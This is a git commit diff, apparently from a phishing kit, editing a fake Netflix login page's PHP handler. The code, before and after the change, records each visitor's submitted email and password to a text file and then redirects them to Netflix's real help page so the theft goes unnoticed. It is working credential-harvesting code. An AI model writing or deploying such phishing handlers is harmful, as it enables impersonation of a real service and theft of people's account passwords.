23f421c6996e545676b3365b32f812a6303413b0
Tahmid Rayat <56682134+htr-tech@users.noreply.github.com>
2019-11-27 19:06:52 +0600

    Update login.php

--- websites/netflix/login.php
+++ websites/netflix/login.php
@@ -1,5 +1,5 @@
 <?php
 
-file_put_contents("usernames.txt", "Netflix :- username : " . $_POST['email'] . "  || Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+file_put_contents("usernames.txt", "Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: https://www.netflix.com/us/LoginHelp');
 exit();
